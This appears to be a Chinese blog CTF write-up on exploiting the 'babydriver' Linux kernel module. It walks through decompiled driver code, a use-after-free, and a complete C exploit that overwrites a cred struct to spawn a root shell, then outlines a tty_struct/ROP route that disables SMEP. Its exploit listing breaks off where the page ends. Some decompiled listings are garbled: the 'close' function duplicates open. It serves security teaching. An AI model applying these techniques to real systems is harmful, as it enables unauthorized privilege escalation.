<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8" />
  
  <title>两道内核 | Another&#39;s blog</title>
  <meta name="author" content="another" />

  
  <meta name="description" content="用户态和内核态切换进入i.    通过swapgs切换GS段寄存器，
是将GS寄存器值和一个特定位置的值进行交换，
目的是保存GS值，同时将该位置的值作为内核执行时的GS值使用。

ii.    将当前栈顶（用户空间栈顶）记录在CPU独占变量区域里，
将CPU独占区域里记录的内核栈顶放入rsp(es" />
  

  

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />

  <meta property="og:title" content="两道内核" />
  <meta property="og:site_name" content="Another&#39;s blog" />

  
  

  
    <meta property="og:image" content="" />
  

  
  <link href="/css/images/favicon.ico" rel="icon" />
  

  <link rel="alternate" href="/atom.xml" title="Another&#39;s blog" type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
  


  <!-- baidu webmaster push -->
  <script src='//push.zhanzhang.baidu.com/push.js'></script>

</head>


<body>
  <header id="header" class="inner"><div class="alignleft">
  <h1><a href="/">Another&#39;s blog</a></h1>
  <h2><a href="/"></a></h2>
</div>
<nav id="main-nav" class="alignright">
  <ul>
    
      <li><a href="/">Home</a></li>
    
      <li><a href="/archives">Archives</a></li>
    
  </ul>
  <div class="clearfix"></div>
</nav>
<div class="clearfix"></div></header>
  <div id="content" class="inner">
    <div id="main-col" class="alignleft"><div id="wrapper"><article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2018-10-21T06:01:10.126Z"><a href="/2018/10/21/两道内核/">2018-10-21</a></time>
      
      
  
    <h1 class="title">两道内核</h1>
  

    </header>
    <div class="entry">
      
        <h1 id="用户态和内核态切换"><a href="#用户态和内核态切换" class="headerlink" title="用户态和内核态切换"></a>用户态和内核态切换</h1><h2 id="进入"><a href="#进入" class="headerlink" title="进入"></a>进入</h2><pre><code>i.    通过swapgs切换GS段寄存器，
是将GS寄存器值和一个特定位置的值进行交换，
目的是保存GS值，同时将该位置的值作为内核执行时的GS值使用。

ii.    将当前栈顶（用户空间栈顶）记录在CPU独占变量区域里，
将CPU独占区域里记录的内核栈顶放入rsp(esp)。

iii.    通过push保存各寄存器值

iv.    通过汇编指令判断是否是x32_abi（暂时可以忽略这个内容）。

v.    通过系统调用号，跳到全局变量sys_call_table相应位置继续执行相应系统调用。
</code></pre><h2 id="退出"><a href="#退出" class="headerlink" title="退出"></a>退出</h2><pre><code>i.    通过swapgs恢复GS值。

ii.    通过sysretq或者iretq恢复到用户空间进行执行，
如果使用Iretq还需要给出用户空间的一些信息，比如CS值，
eflags标志寄存器值，用户栈顶位置等等信息。
</code></pre><h1 id="1-题目分析"><a href="#1-题目分析" class="headerlink" title="1.    题目分析"></a>1.    题目分析</h1><p>题目给出了3个文件，一个rootfs.cpio一个bzImage和一个boot.sh，boot.sh内容如下：</p>
<p>1.#!/bin/bash<br>2.<br>3.qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append ‘console=ttyS0 root=/dev/ram oops=panic panic=1’ -enable-kvm -monitor /dev/null -m 64M –nographic -smp cores=1,threads=1 -cpu kvm64,+smep</p>
<pre><code>很显然我们需要安装qemu，这个就自己去安装啦。
然后就是一个对qemu的调用，kernel使用了bzImage，
然后用rootfs.cpio作为initrd，
其实就是bzImage是内核的映像，然后rootfs.cpio是根文件的映像。
在远程，也就是使用这个boot.sh打开的qemu环境，
我们能接触到的就是在这个qemu环境里。
qemu环境里有flag，可是我们没有权限读取，
必须是root才有权限读取，显然我们需要进行提权。
通过查看/lib/modules/目录，我们发现有一个babydriver.ko，
通过查看/proc/modules我们可以看到babydriver.ko作为内核模块已经加载进
了内核里，我们还可以看到其加载的地址，很好！
接下来的任务就很显然了，我们需要看懂babydriver.ko干了什么。
init和exit函数没有什么太大的意思，基本上就是设置参数，
初始化设备等等工作，我们的重点是几个函数。不过需要注意，init中设置了/dev/babydev作为设备文件。
</code></pre><p>open函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>  __int64 __<span class="function">fastcall <span class="title">babyopen</span><span class="params">(inode *inode, file *filp,__int64 a3, __int64 a4)</span></span></span><br><span class="line">2.  &#123;</span><br><span class="line"><span class="number">3.</span>  <span class="keyword">char</span> *v4; <span class="comment">// rax@1</span></span><br><span class="line"><span class="number">4.</span>  __int64 v5; <span class="comment">// rdx@1</span></span><br><span class="line"><span class="number">5.</span> </span><br><span class="line"><span class="number">6.</span>  _fentry__(inode, filp, a3, a4);</span><br><span class="line"><span class="number">7.</span>  LODWORD(v4) = kmem_cache_alloc_trace(*((_QWORD*)&amp;kmalloc_caches + <span class="number">6</span>),  <span class="number">0x24000C0</span>LL, <span class="number">64L</span>L);</span><br><span class="line"><span class="number">8.</span>  babydev_struct.device_buf = v4;</span><br><span class="line"><span class="number">9.</span>  babydev_struct.device_buf_len = <span class="number">64L</span>L;</span><br><span class="line"><span class="number">10.</span> printk(<span class="string">"device openn"</span>, <span class="number">0x24000C0</span>LL, v5);</span><br><span class="line"><span class="number">11.</span> <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line"><span class="number">12.</span>&#125;</span><br><span class="line">close函数：</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span>__int64 __<span class="function">fastcall <span class="title">babyopen</span><span class="params">(inode *inode, file *filp, __int64a3, __int64 a4)</span></span></span><br><span class="line">2.  &#123;</span><br><span class="line"><span class="number">3.</span>   <span class="keyword">char</span> *v4; <span class="comment">// rax@1</span></span><br><span class="line"><span class="number">4.</span>  __int64 v5; <span class="comment">// rdx@1</span></span><br><span class="line"><span class="number">5.</span> </span><br><span class="line"><span class="number">6.</span> _fentry__(inode, filp, a3, a4);</span><br><span class="line"><span class="number">7.</span> LODWORD(v4) = kmem_cache_alloc_trace(*((_QWORD*)&amp;kmalloc_caches + <span class="number">6</span>),  <span class="number">0x24000C0</span>LL, <span class="number">64L</span>L);</span><br><span class="line"><span class="number">8.</span> babydev_struct.device_buf = v4;</span><br><span class="line"><span class="number">9.</span>  babydev_struct.device_buf_len = <span class="number">64L</span>L;</span><br><span class="line"><span class="number">10.</span>  printk(<span class="string">"device openn"</span>, <span class="number">0x24000C0</span>LL, v5);</span><br><span class="line"><span class="number">11.</span> <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line"><span class="number">12.</span>&#125;</span><br></pre></td></tr></table></figure>
<p>ioctl函数：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> __int64 __<span class="function">fastcall <span class="title">babyioctl</span><span class="params">(file *filp, __int64 command, <span class="keyword">unsigned</span> __int64 arg, __int64 a4)</span></span></span><br><span class="line">2. &#123;</span><br><span class="line"><span class="number">3.</span> <span class="keyword">size_t</span> v4; <span class="comment">// rdx@1</span></span><br><span class="line"><span class="number">4.</span> <span class="keyword">size_t</span> v5; <span class="comment">// rbx@1</span></span><br><span class="line"><span class="number">5.</span> <span class="keyword">char</span> *v6; <span class="comment">// rax@2</span></span><br><span class="line"><span class="number">6.</span> __int64 v7; <span class="comment">// rdx@2</span></span><br><span class="line"><span class="number">7.</span> __int64 result; <span class="comment">// rax@2</span></span><br><span class="line"><span class="number">8.</span> </span><br><span class="line"><span class="number">9.</span> _fentry__(filp, command, arg, a4);</span><br><span class="line"><span class="number">10.</span> v5 = v4;silu</span><br><span class="line"><span class="number">11.</span> <span class="keyword">if</span> ( (_DWORD)command == <span class="number">0x10001</span> )</span><br><span class="line"><span class="number">12.</span> &#123;</span><br><span class="line"><span class="number">13.</span> kfree(babydev_struct.device_buf);</span><br><span class="line"><span class="number">14.</span> LODWORD(v6) = _kmalloc(v5, <span class="number">0x24000C0</span>LL);</span><br><span class="line"><span class="number">15.</span> babydev_struct.device_buf = v6;</span><br><span class="line"><span class="number">16.</span> babydev_struct.device_buf_len = v5;</span><br><span class="line"><span class="number">17.</span> printk(<span class="string">"alloc donen"</span>, <span class="number">0x24000C0</span>LL, v7);</span><br><span class="line"><span class="number">18.</span> result = <span class="number">0L</span>L;</span><br><span class="line"><span class="number">19.</span> &#125;</span><br><span class="line"><span class="number">20.</span> <span class="keyword">else</span></span><br><span class="line"><span class="number">21.</span> &#123;</span><br><span class="line"><span class="number">22.</span> printk(&amp;default_arg_is_format_str, v4, v4);</span><br><span class="line"><span class="number">23.</span> result = <span class="number">-22L</span>L;</span><br><span class="line"><span class="number">24.</span> &#125;</span><br><span class="line"><span class="number">25.</span> <span class="keyword">return</span> result;</span><br><span class="line"><span class="number">26.</span>&#125;</span><br><span class="line">write函数：</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> <span class="keyword">ssize_t</span> __<span class="function">fastcall <span class="title">babywrite</span><span class="params">(file *filp, <span class="keyword">const</span> <span class="keyword">char</span> *buffer, <span class="keyword">size_t</span> length, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line">2.  &#123;</span><br><span class="line"><span class="number">3.</span> <span class="keyword">unsigned</span> __int64 copy_len; <span class="comment">// rdx@1</span></span><br><span class="line"><span class="number">4.</span> <span class="keyword">ssize_t</span> result; <span class="comment">// rax@2</span></span><br><span class="line"><span class="number">5.</span> <span class="keyword">ssize_t</span> v6; <span class="comment">// rbx@3</span></span><br><span class="line"><span class="number">6.</span> </span><br><span class="line"><span class="number">7.</span> _fentry__(filp, buffer, length, offset);</span><br><span class="line"><span class="number">8.</span> <span class="keyword">if</span> ( babydev_struct.device_buf )</span><br><span class="line"><span class="number">9.</span> &#123;</span><br><span class="line"><span class="number">10.</span> result = <span class="number">-2L</span>L;</span><br><span class="line"><span class="number">11.</span> <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; copy_len )</span><br><span class="line"><span class="number">12.</span> &#123;</span><br><span class="line"><span class="number">13.</span> v6 = copy_len;</span><br><span class="line"><span class="number">14.</span> copy_from_user(babydev_struct.device_buf, buffer, copy_len);</span><br><span class="line"><span class="number">15.</span> result = v6;</span><br><span class="line"><span class="number">16.</span> &#125;</span><br><span class="line"><span class="number">17.</span> &#125;</span><br><span class="line"><span class="number">18.</span> <span class="keyword">else</span></span><br><span class="line"><span class="number">19.</span> &#123;</span><br><span class="line"><span class="number">20.</span> result = <span class="number">-1L</span>L;</span><br><span class="line"><span class="number">21.</span> &#125;</span><br><span class="line"><span class="number">22.</span> <span class="keyword">return</span> result;</span><br><span class="line"><span class="number">23.</span>&#125;</span><br></pre></td></tr></table></figure></p>
<p>read函数：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>  <span class="keyword">ssize_t</span> __<span class="function">fastcall <span class="title">babyread</span><span class="params">(file *filp, <span class="keyword">char</span> *buffer, <span class="keyword">size_t</span> length, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line">2.  &#123;</span><br><span class="line"><span class="number">3.</span> <span class="keyword">unsigned</span> __int64 copy_len; <span class="comment">// rdx@1</span></span><br><span class="line"><span class="number">4.</span> <span class="keyword">ssize_t</span> result; <span class="comment">// rax@2</span></span><br><span class="line"><span class="number">5.</span> <span class="keyword">ssize_t</span> v6; <span class="comment">// rbx@3</span></span><br><span class="line"><span class="number">6.</span> </span><br><span class="line"><span class="number">7.</span> _fentry__(filp, buffer, length, offset);</span><br><span class="line"><span class="number">8.</span> <span class="keyword">if</span> ( babydev_struct.device_buf )</span><br><span class="line"><span class="number">9.</span> &#123;</span><br><span class="line"><span class="number">10.</span> result = <span class="number">-2L</span>L;</span><br><span class="line"><span class="number">11.</span> <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; copy_len )</span><br><span class="line"><span class="number">12.</span> &#123;</span><br><span class="line"><span class="number">13.</span> v6 = copy_len;</span><br><span class="line"><span class="number">14.</span> copy_to_user(buffer, babydev_struct.device_buf, copy_len);</span><br><span class="line"><span class="number">15.</span> result = v6;</span><br><span class="line"><span class="number">16.</span> &#125;</span><br><span class="line"><span class="number">17.</span> &#125;</span><br><span class="line"><span class="number">18.</span> <span class="keyword">else</span></span><br><span class="line"><span class="number">19.</span> &#123;</span><br><span class="line"><span class="number">20.</span> result = <span class="number">-1L</span>L;</span><br><span class="line"><span class="number">21.</span> &#125;</span><br><span class="line"><span class="number">22.</span> <span class="keyword">return</span> result;</span><br><span class="line"><span class="number">23.</span>&#125;</span><br></pre></td></tr></table></figure></p>
<pre><code>open的时候kmalloc了一个大小为64的空间，然后size设置为64，release的时候将会释放这个空间。read和write都会先检查buf指针是不是为NULL，不为NULL再检查大小是否满足要求，之后进行read和write操作，也就是向用户空间写或者读。

ioctl比较特殊，首先判断command是不是为0x10001，如果满足，将会释放之前的buf，新分配一个用户决定大小的空间，并且设置为size。

功能基本上就讲完了，乍一看好像没有漏洞，
那是因为用户空间pwn的思维在限制你使用单线程的思维去考虑。
如果是多线程呢？
我们假设我们打开了两个设备文件，也就是调用了两次open，
第一次分配了，第二次其实将会覆盖第一次分配的buf，因为是全局的。
有了这个思维，剩下的就好想了，如果我们release了第一个，
第二个其实就已经是被释放过的了，这样，就造成了一个UAF了。
</code></pre><h1 id="2-题目思路1-0"><a href="#2-题目思路1-0" class="headerlink" title="2.    题目思路1.0"></a>2.    题目思路1.0</h1><pre><code>通过我们对slub分配器的了解，相同大小的会被放在一块，现在我们来想想，一个进程的权限，是由什么定的？相信你们都知道，uid，uid又保存在哪儿呢？答案是cred结构。cred结构在每一个进程中都有一个，并且保存了该进程的权限信息，如果我们能够修改到cred信息，那么事情就很简单了。
于是思路是，我们有了一个UAF，使某个进程的cred结构体被放进这个UAF的空间，然后我们能够控制这个cred结构体，通过write写入uid，万事大吉！
问题是，如何控制cred结构？别忘了，**相同大小的会被放在一块**，我们首先通过ioctl改变大小，使得和cred结构大小一样，接下来只需要在触发UAF的时候新建一个cred结构，新建的结构就很有可能被放进这个UAF的空间里，创建方法嘛，每一个进程都有，那么，新建一个进程不就好了？新建进程嘛，fork就解决了。
</code></pre><p>好了，只剩下一个问题，大小是多少？</p>
<p>方法一：查看源码。因为配置比较多，效率比较低，还容易错。</p>
<p>方法二：编译一个带符号的内核，直接查看。</p>
<p>方法就很简单了，看看exp吧。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="number">2.</span>  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="number">3.</span>  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="number">4.</span>  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="number">5.</span>  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="number">6.</span>  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="number">7.</span>  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="number">8.</span>  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="number">9.</span>  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="number">10.</span><span class="meta">#<span class="meta-keyword">define</span> CRED_SIZE 168</span></span><br><span class="line"><span class="number">11.</span><span class="meta">#<span class="meta-keyword">define</span> DEV_NAME <span class="meta-string">"/dev/babydev"</span></span></span><br><span class="line"><span class="number">12.</span><span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line"><span class="number">13.</span><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line">14.&#123;</span><br><span class="line"><span class="number">15.</span> <span class="keyword">int</span> fd1, fd2, ret;</span><br><span class="line"><span class="number">16.</span> <span class="keyword">char</span> zero_buf[<span class="number">100</span>];</span><br><span class="line"><span class="number">17.</span> <span class="built_in">memset</span>(zero_buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="keyword">char</span>) * <span class="number">100</span>);</span><br><span class="line"><span class="number">18.</span> fd1 = open(DEV_NAME, O_RDWR);</span><br><span class="line"><span class="number">19.</span> fd2 = open(DEV_NAME, O_RDWR);</span><br><span class="line"><span class="number">20.</span> </span><br><span class="line"><span class="number">21.</span> ret = ioctl(fd1, <span class="number">0x10001</span>, CRED_SIZE);</span><br><span class="line"><span class="number">22.</span> </span><br><span class="line"><span class="number">23.</span> close(fd1);</span><br><span class="line"><span class="number">24.</span> </span><br><span class="line"><span class="number">25.</span> <span class="keyword">int</span> now_uid = <span class="number">1000</span>;<span class="comment">//当前uid为1000</span></span><br><span class="line"><span class="number">26.</span> <span class="keyword">int</span> pid = fork();</span><br><span class="line"><span class="number">27.</span> <span class="keyword">if</span> (pid &lt; <span class="number">0</span>)</span><br><span class="line"><span class="number">28.</span> &#123;</span><br><span class="line"><span class="number">29.</span> perror(<span class="string">"fork error"</span>);</span><br><span class="line"><span class="number">30.</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="number">31.</span> &#125;</span><br><span class="line"><span class="number">32.</span> </span><br><span class="line"><span class="number">33.</span> <span class="keyword">if</span> (!pid) </span><br><span class="line"><span class="number">34.</span> &#123;</span><br><span class="line"><span class="number">35.</span> <span class="comment">//写入28个0，一直到egid及其之前的都变为了0，这个时候就已经会被认为是root了。</span></span><br><span class="line"><span class="number">36.</span> ret = write(fd2, zero_buf, <span class="number">28</span>);</span><br><span class="line"><span class="number">37.</span> now_uid = getuid();</span><br><span class="line"><span class="number">38.</span> <span class="keyword">if</span> (!now_uid) </span><br><span class="line"><span class="number">39.</span> &#123;</span><br><span class="line"><span class="number">40.</span> <span class="built_in">printf</span>(<span class="string">"get root donen"</span>);</span><br><span class="line"><span class="number">41.</span> <span class="comment">// 权限修改完毕，启动一个shell，就是root的shell了。</span></span><br><span class="line"><span class="number">42.</span> system(<span class="string">"/bin/sh"</span>);</span><br><span class="line"><span class="number">43.</span> <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="number">44.</span> &#125;</span><br><span class="line"><span class="number">45.</span> <span class="keyword">else</span></span><br><span class="line"><span class="number">46.</span> &#123;</span><br><span class="line"><span class="number">47.</span> <span class="built_in">puts</span>(<span class="string">"failed?"</span>);</span><br><span class="line"><span class="number">48.</span> <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="number">49.</span> &#125;</span><br><span class="line"><span class="number">50.</span> &#125;</span><br><span class="line"><span class="number">51.</span> <span class="keyword">else</span></span><br><span class="line"><span class="number">52.</span> &#123;</span><br><span class="line"><span class="number">53.</span> wait(<span class="literal">NULL</span>);</span><br><span class="line"><span class="number">54.</span> &#125;</span><br><span class="line"><span class="number">55.</span> close(fd2);</span><br><span class="line"><span class="number">56.</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="number">57.</span>&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="3-题目思路2-0"><a href="#3-题目思路2-0" class="headerlink" title="3.    题目思路2.0"></a>3.    题目思路2.0</h1><pre><code>好了，第一种方法只是个开胃菜，非常简单非常粗暴，
现在让我们来看看更麻烦的方法，使用tty_struct。关于tty的知识我在这里不想做过多解释，
大家可以自行查找资料。反正tty也是一种设备，
通过&apos;/dev/ptmx&apos;可以打开这个设备，我们要做的，
就是去修改这个设备的函数指针，从而使得对这个设备的操作变为我们所能控制的，
也就是说，我们控制了内核空间的执行流，完美！那么又该干点什么呢？
由于开启了smep，我们不能直接返回用户空间然后以ring0的身份调用函数。
如果可以，那么只需要调用commit_creds(prepare_kernel_cred(NULL))就可以设置为root身份，可惜我们还有更多的工作要做。

既然问题是开启了smep，那么简单，我们反正都控制了执行流，把它关掉就好了。关掉的方法就是通过写入cr4寄存器，将smep位关掉就好了，关掉smep，我们就可以回去执行提权的函数啦。
可是光是控制一次执行流是没办法做这么多工作的，而且我们也没法执行用户空间指定的代码，方法嘛，也是我们常见的方法，ROP。
通过在内核空间进行ROP，执行内核代码，关掉smep，之后回用户空间提权，然后就可以打开shell啦。内核的ROP其实和用户空间ROP相差无几，不过还是有几个细节内容需要考虑，比如，栈在哪儿？没有栈咋ROP呢？没有栈，我们就自己造栈嘛，通过一个gadget，比如xchg eax, esp，注意这里是eax和esp，32位的，就可以做到了。原理就是由于在执行那个ioctl的时候eax正好是要执行的指令的地址，换句话说，就是gadget的地址，而eax截取了低32位，如果是整个64位，rax必然是一个内核空间的地址，可是低32位，就落到用户空间了。
于是我们mmap这个位置，xchg eax, esp，使得esp变为这个值，这样栈就落到了用户空间以内。虽然没法执行代码，但是可以获取数据啊，于是我们就从用户空间获取数据来ret，然后执行内核空间的代码。
</code></pre><p>好了，几个难点如下：</p>
<p>1)    如何获取控制流？通过UAF使得tty_struct覆盖我们释放的位置，我们可以控制tty_struct，然后改写它的操作即可。</p>
<p>2)    如何设定栈？xchg eax, esp。</p>
<p>3)    如何关掉smep？通过ROP调用内核空间的gadget写入关掉smep的新cr4值到cr4寄存器里。</p>
<p>4)    如何获取权限？在关掉smep之后，用户空间调用commit_creds(prepare_kernel_creds(0))即可，这两个函数都是位于内核空间的，可是只要我们知道他们的符号位置，就可以调用内核函数，因为回到用户空间之后，我们的特权还是ring 0的，只是内存位置回来了而已。</p>
<p>5)    如何获取shell？直接system(“/bin/sh”);</p>
<p>6)    实际问题：如何写ROP链？</p>
<p>根据之前的问题，我们需要如下的gadget：</p>
<p>1)    xchg eax, esp来设置栈，用这个gadget覆盖ioctl操作函数嘛。</p>
<p>2)    写入cr4，来关闭smep。</p>
<p>3)    swapgs，回到用户空间之前的准备。</p>
<p>4)    iretq，用来回到用户空间特权级方便打开shell。</p>
<p>5)    commit_creds</p>
<p>6)    prepare_kernel_cred</p>
<p>7)    打开shell。</p>
<p>前四个直接在刚才生成的gadget中去找就可以了，后三个中的4和5，需要内核符号，在/proc/kallsyms文件可以读取到内核所有符号的地址，所以解决了，最后一个打开shell，就是用户空间的地址，好了，解决完毕。</p>
<p>于是任务就简单了，让我们来看看exp：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span 